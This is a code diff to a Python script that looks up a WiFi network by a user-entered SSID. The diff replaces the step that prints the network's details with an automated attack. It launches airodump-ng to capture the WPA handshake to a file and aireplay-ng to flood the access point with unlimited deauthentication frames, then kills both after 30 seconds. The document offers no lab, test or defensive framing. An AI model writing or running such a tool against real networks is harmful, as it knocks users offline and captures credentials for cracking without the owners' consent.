@@ -49,6 +49,25 @@ def parse_wifi_data(scan_data, ssid):
             return network_info
         return None
 
+def start_monitoring_tools(network_info, interface):
+    channel = network_info['Channel']
+    mac_address = network_info['MAC Address']
+    
+    # Commands to run in new terminal windows
+    airodump_cmd = f"gnome-terminal -- airodump-ng -c {channel} -w hash --bssid {mac_address} {interface}"
+    aireplay_cmd = f"gnome-terminal -- aireplay-ng -0 0 -a {mac_address} {interface}"
+    
+    # Start the commands in separate terminals
+    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airodump_cmd])
+    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', aireplay_cmd])
+    
+    # Run both commands for 30 seconds
+    time.sleep(30)
+
+    # Find and kill the processes to terminate them after 30 seconds
+    subprocess.run(['pkill', '-f', 'airodump-ng'])
+    subprocess.run(['pkill', '-f', 'aireplay-ng'])
+
 def main():
     ssid_input = input("Enter the SSID you want to look up: ")
     interface = get_interface()
@@ -58,13 +77,9 @@ def main():
         if scan_data:
             network_info = parse_wifi_data(scan_data, ssid_input)
             if network_info:
-                print(f"Details for SSID '{ssid_input}':")
-                print(f"MAC Address: {network_info['MAC Address']}")
-                print(f"Channel: {network_info['Channel']}")
-                print(f"Signal Strength: {network_info['Signal Strength']}")
-                print(f"Security: {network_info['Security']}")
+                start_monitoring_tools(network_info, interface)
                 break
-        time.sleep(5)  # Scan every 5 seconds
+        time.sleep(2)  # Scan every 2 seconds
 
 if __name__ == "__main__":
     main()
